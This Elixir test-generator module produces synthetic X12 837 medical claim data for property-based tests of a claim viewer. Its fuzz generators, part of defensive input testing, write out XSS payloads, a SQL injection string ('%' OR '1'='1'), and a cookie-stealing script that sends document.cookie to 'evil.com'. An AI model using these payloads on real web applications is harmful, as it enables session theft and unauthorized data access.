defmodule ClaimViewer.Generators do
  @moduledoc """
  StreamData generators for HIPAA-compliant property-based testing.

  Generates realistic X12 837 claim data with fuzz variants that include
  HTML injection, SQL wildcards, unicode, empty strings, and boundary values.
  """

  import StreamData

  # ===== Primitive Generators =====

  @doc "Valid 10-digit NPI"
  def gen_npi do
    string(?0..?9, length: 10)
  end

  @doc "Invalid NPI: wrong length, non-digits, special chars"
  def gen_invalid_npi do
    one_of([
      string(:alphanumeric, min_length: 1, max_length: 9),
      string(:alphanumeric, min_length: 11, max_length: 20),
      constant(""),
      constant("123-456-78"),
      constant("abcdefghij"),
      gen_xss_string()
    ])
  end

  @doc "ISO 8601 date string"
  def gen_iso_date do
    bind(integer(2000..2030), fn year ->
      bind(integer(1..12), fn month ->
        max_day = Calendar.ISO.days_in_month(year, month)

        bind(integer(1..max_day), fn day ->
          date = Date.new!(year, month, day)
          constant(Date.to_iso8601(date))
        end)
      end)
    end)
  end

  @doc "Strings that include XSS payloads, HTML tags, script injections"
  def gen_xss_string do
    one_of([
      constant("<script>alert('xss')</script>"),
      constant("<img src=x onerror=alert(1)>"),
      constant("\" onmouseover=\"alert(1)"),
      constant("<b>bold</b>"),
      constant("</div><div>injection"),
      constant("&amp;&lt;&gt;&quot;"),
      constant("<iframe src='evil.com'></iframe>"),
      constant("javascript:alert(1)"),
      map(string(:printable, min_length: 1, max_length: 50), fn s ->
        "<script>#{s}</script>"
      end)
    ])
  end

  @doc "Strings with SQL LIKE wildcards"
  def gen_sql_wildcard_string do
    one_of([
      constant("%"),
      constant("_"),
      constant("%%"),
      constant("%_%"),
      constant("test%value"),
      constant("under_score"),
      constant("back\\slash"),
      constant("%' OR '1'='1")
    ])
  end

  @doc "Safe printable string (HIPAA-safe — no PHI)"
  def gen_safe_string(opts \\ []) do
    min = Keyword.get(opts, :min_length, 0)
    max = Keyword.get(opts, :max_length, 100)
    string(:printable, min_length: min, max_length: max)
  end

  @doc "Fuzz string: mix of safe, XSS, SQL wildcards, unicode, empty"
  def gen_fuzz_string do
    frequency([
      {5, gen_safe_string(min_length: 1, max_length: 50)},
      {2, gen_xss_string()},
      {1, gen_sql_wildcard_string()},
      {1, constant("")},
      {1, constant(nil)}
    ])
  end

  @doc "Positive number (for charges, etc.)"
  def gen_positive_number do
    one_of([
      map(integer(0..999_999), fn n -> n * 1.0 end),
      float(min: 0.0, max: 999_999.99)
    ])
  end

  @doc "US state code"
  def gen_state do
    member_of(~w(AL AK AZ AR CA CO CT DE FL GA HI ID IL IN IA KS KY LA ME MD
                 MA MI MN MS MO MT NE NV NH NJ NM NY NC ND OH OK OR PA RI SC
                 SD TN TX UT VT VA WA WV WI WY))
  end

  @doc "5-digit ZIP code"
  def gen_zip do
    string(?0..?9, length: 5)
  end

  # ===== X12 Struct Map Generators =====

  def gen_address_map do
    fixed_map(%{
      "street" => gen_safe_string(min_length: 1, max_length: 60),
      "city" => gen_safe_string(min_length: 1, max_length: 30),
      "state" => gen_state(),
      "zip" => gen_zip()
    })
  end

  def gen_transaction_map do
    fixed_map(%{
      "type" => constant("837"),
      "controlNumber" => string(?0..?9, min_length: 4, max_length: 9),
      "version" => constant("005010X222A1"),
      "purpose" => member_of(["00", "18"]),
      "referenceId" => string(:alphanumeric, min_length: 1, max_length: 30),
      "date" => gen_iso_date(),
      "time" => constant("1200")
    })
  end

  def gen_submitter_map do
    fixed_map(%{
      "name" => gen_safe_string(min_length: 1, max_length: 60),
      "id" => string(:alphanumeric, min_length: 1, max_length: 20),
      "contact" =>
        fixed_map(%{
          "name" => gen_safe_string(min_length: 1, max_length: 40),
          "phone" => string(?0..?9, length: 10),
          "extension" => one_of([constant(""), string(?0..?9, min_length: 1, max_length: 5)])
        })
    })
  end

  def gen_receiver_map do
    fixed_map(%{
      "name" => gen_safe_string(min_length: 1, max_length: 60),
      "id" => string(:alphanumeric, min_length: 1, max_length: 20)
    })
  end

  def gen_billing_provider_map do
    fixed_map(%{
      "name" => gen_safe_string(min_length: 1, max_length: 60),
      "taxId" => string(?0..?9, length: 9),
      "npi" => gen_npi(),
      "address" => gen_address_map()
    })
  end

  def gen_pay_to_provider_map do
    fixed_map(%{
      "name" => gen_safe_string(min_length: 1, max_length: 60),
      "taxId" => string(?0..?9, length: 9),
      "npi" => gen_npi(),
      "address" => gen_address_map()
    })
  end

  def gen_subscriber_map do
    fixed_map(%{
      "firstName" => gen_safe_string(min_length: 1, max_length: 35),
      "lastName" => gen_safe_string(min_length: 1, max_length: 60),
      "id" => string(:alphanumeric, min_length: 1, max_length: 20),
      "dob" => gen_iso_date(),
      "sex" => member_of(["M", "F", "U"]),
      "relationship" => member_of(["18", "01", "19", "20", "21", "39", "40", "53", "G8"]),
      "groupNumber" => string(:alphanumeric, min_length: 1, max_length: 20),
      "planType" => member_of(["CI", "HM", "MB", "MC", "OF"]),
      "address" => gen_address_map()
    })
  end

  def gen_payer_map do
    fixed_map(%{
      "name" => gen_safe_string(min_length: 1, max_length: 60),
      "payerId" => string(:alphanumeric, min_length: 1, max_length: 20)
    })
  end

  def gen_claim_info_map do
    fixed_map(%{
      "id" => string(:alphanumeric, min_length: 1, max_length: 20),
      "totalCharge" => gen_positive_number(),
      "placeOfService" => member_of(["11", "12", "21", "22", "23", "24", "31", "32", "81"]),
      "serviceType" => member_of(["", "A", "B", "C"]),
      "indicators" => gen_indicators_map(),
      "onsetDate" => one_of([gen_iso_date(), constant("")]),
      "clearinghouseClaimNumber" => string(:alphanumeric, min_length: 1, max_length: 20)
    })
  end

  def gen_indicators_map do
    frequency([
      {3,
       fixed_map(%{
         "assignmentOfBenefits" => member_of(["Y", "A", "I", "N", "W"]),
         "releaseOfInfo" => member_of(["Y", "A", "I", "N"]),
         "providerSignature" => member_of(["Y", "A", "I", "N"])
       })},
      {1, constant(%{})}
    ])
  end

  def gen_diagnosis_map do
    fixed_map(%{
      "primary" => gen_icd10_code(),
      "secondary" => list_of(gen_icd10_code(), min_length: 0, max_length: 11)
    })
  end

  defp gen_icd10_code do
    map(
      {member_of(~w(A B C D E F G H I J K L M N O P Q R S T U V W X Y Z)),
       string(?0..?9, min_length: 2, max_length: 5)},
      fn {letter, digits} -> "#{letter}#{digits}" end
    )
  end

  def gen_rendering_provider_map do
    fixed_map(%{
      "firstName" => gen_safe_string(min_length: 1, max_length: 35),
      "lastName" => gen_safe_string(min_length: 1, max_length: 60),
      "npi" => gen_npi()
    })
  end

  def gen_service_facility_map do
    fixed_map(%{
      "name" => gen_safe_string(min_length: 1, max_length: 60),
      "taxId" => string(?0..?9, length: 9),
      "address" => gen_address_map()
    })
  end

  def gen_service_line_map do
    fixed_map(%{
      "lineNumber" => integer(1..99),
      "codeQualifier" => member_of(["HC", "IV", "ZZ"]),
      "procedureCode" => string(:alphanumeric, min_length: 5, max_length: 5),
      "charge" => gen_positive_number(),
      "unitQualifier" => member_of(["UN", "MJ"]),
      "units" => map(integer(1..100), &(&1 * 1.0)),
      "diagnosisPointer" => member_of(["1", "1:2", "1:2:3", "1:2:3:4"]),
      "emergencyIndicator" => member_of(["", "Y"]),
      "serviceDate" => gen_iso_date(),
      "placeOfService" => member_of(["11", "12", "21", "22"])
    })
  end

  # ===== Full Sections Generators =====

  @doc "Generate a complete valid sections list matching the Python parser output"
  def gen_valid_sections do
    fixed_list([
      map(gen_transaction_map(), &wrap_section("transaction", &1)),
      map(gen_submitter_map(), &wrap_section("submitter", &1)),
      map(gen_receiver_map(), &wrap_section("receiver", &1)),
      map(gen_billing_provider_map(), &wrap_section("billing_Provider", &1)),
      map(gen_pay_to_provider_map(), &wrap_section("Pay_To_provider", &1)),
      map(gen_subscriber_map(), &wrap_section("subscriber", &1)),
      map(gen_payer_map(), &wrap_section("payer", &1)),
      map(gen_claim_info_map(), &wrap_section("claim", &1)),
      map(gen_diagnosis_map(), &wrap_section("diagnosis", &1)),
      map(gen_rendering_provider_map(), &wrap_section("renderingProvider", &1)),
      map(gen_service_facility_map(), &wrap_section("serviceFacility", &1)),
      map(
        list_of(gen_service_line_map(), min_length: 1, max_length: 50),
        &wrap_section("service_Lines", &1)
      )
    ])
  end

  @doc "Sections with XSS payloads injected into all string fields"
  def gen_xss_sections do
    fixed_list([
      constant(
        wrap_section("subscriber", %{
          "firstName" => "<script>alert('PHI')</script>",
          "lastName" => "<img src=x onerror=alert(document.cookie)>",
          "id" => "\" onclick=\"steal()",
          "dob" => "2000-01-01",
          "sex" => "M",
          "relationship" => "18",
          "groupNumber" => "<b>GROUP</b>",
          "planType" => "CI",
          "address" => %{
            "street" => "<div>INJECTED</div>",
            "city" => "Test",
            "state" => "CA",
            "zip" => "90210"
          }
        })
      ),
      constant(
        wrap_section("payer", %{
          "name" => "<script>document.location='evil.com?c='+document.cookie</script>",
          "payerId" => "PAYER1"
        })
      ),
      constant(
        wrap_section("claim", %{
          "id" => "1",
          "totalCharge" => 100.0,
          "placeOfService" => "11",
          "serviceType" => "",
          "indicators" => %{"a" => "Y"},
          "onsetDate" => "",
          "clearinghouseClaimNumber" => "<iframe src='evil'></iframe>"
        })
      ),
      constant(
        wrap_section("service_Lines", [
          %{
            "lineNumber" => 1,
            "codeQualifier" => "HC",
            "procedureCode" => "99213",
            "charge" => 50.0,
            "unitQualifier" => "UN",
            "units" => 1.0,
            "diagnosisPointer" => "1",
            "emergencyIndicator" => "",
            "serviceDate" => "2025-01-01",
            "placeOfService" => "11"
          }
        ])
      )
    ])
  end

  defp wrap_section(name, data), do: %{"section" => name, "data" => data}

  # ===== Claim Attrs Generators =====

  @doc "Valid claim attrs for Claim.changeset"
  def gen_valid_claim_attrs do
    bind(gen_valid_sections(), fn sections ->
      constant(%{
        raw_json: sections,
        member_first_name: "Jane",
        member_last_name: "Doe",
        payer_name: "TestPayer",
        billing_provider_npi: "1234567890",
        rendering_provider_npi: "0987654321",
        date_of_service: ~D[2025-01-15]
      })
    end)
  end

  @doc "Fuzz claim attrs: some fields may have XSS, bad NPIs, etc."
  def gen_fuzz_claim_attrs do
    fixed_map(%{
      raw_json: gen_valid_sections(),
      member_first_name: gen_fuzz_string(),
      member_last_name: gen_fuzz_string(),
      payer_name: gen_fuzz_string(),
      billing_provider_npi:
        frequency([
          {3, gen_npi()},
          {1, gen_invalid_npi()},
          {1, constant(nil)}
        ]),
      rendering_provider_npi:
        frequency([
          {3, gen_npi()},
          {1, gen_invalid_npi()},
          {1, constant(nil)}
        ]),
      date_of_service:
        frequency([
          {3, map(gen_iso_date(), fn d -> Date.from_iso8601!(d) end)},
          {1, constant(nil)}
        ])
    })
  end
end
